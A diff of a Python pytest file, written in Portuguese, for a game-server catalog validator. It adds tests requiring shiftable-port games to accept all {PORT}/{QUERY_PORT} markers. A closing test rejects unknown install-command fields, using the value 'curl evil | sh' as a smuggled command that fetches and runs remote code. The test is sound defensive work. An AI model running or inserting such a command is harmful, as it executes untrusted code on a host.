@@ -129,6 +129,33 @@ def test_campo_invalido_e_recusado(dados_de_jogo, campo, valor):
     assert campo in str(erro.value)
 
 
+@pytest.mark.parametrize(("mudancas", "trecho"), [
+    ({"portas": ["7777/udp", "27016/udp", "2303/udp"]}, "portas extras"),
+    ({"start_args": "-log"}, "{PORT}"),
+    ({"start_args": "-port={PORT}"}, "{QUERY_PORT}"),
+])
+def test_deslocavel_exige_que_o_jogo_receba_todas_as_portas(dados_de_jogo, mudancas, trecho):
+    """Sem isso o firewall abriria uma porta que o jogo nao escuta (ou uma que ele ignora)."""
+    dados_de_jogo.update(mudancas)
+    with pytest.raises(ErroDeValidacao, match="deslocavel") as erro:
+        cat.validar_dinamico(dados_de_jogo)
+    assert trecho in str(erro.value)
+
+
+def test_jogo_fixo_pode_ter_portas_extras_e_nenhum_marcador(dados_de_jogo):
+    dados_de_jogo.update(portas=["7777/udp", "27016/udp", "2303/udp"], start_args="-log", deslocavel=False)
+    assert cat.validar_dinamico(dados_de_jogo).deslocavel is False
+
+
+def test_jogo_curado_deslocavel_sem_marcador_vira_erro_do_catalogo(tmp_path):
+    (tmp_path / "ruim.env").write_text(
+        'GAME_KEY=ruim\nSTEAM_APP_ID=1\nGAME_PORT=7001\nGAME_PORTS="7001/udp"\nPORTS_SHIFTABLE=1\n', encoding="utf-8")
+    jogos, erros = cat.carregar_curado(tmp_path)
+    assert jogos == {}
+    assert "PORTS_SHIFTABLE" in erros[0]
+    assert "{PORT}" in erros[0]
+
+
 @pytest.mark.parametrize("campo", ["pre_install_cmd", "post_install_cmd", "provision_script", "PRE_INSTALL_CMD", "x"])
 def test_campo_desconhecido_e_recusado_para_nao_entrar_comando_de_contrabando(dados_de_jogo, campo):
     dados_de_jogo[campo] = "curl evil | sh"
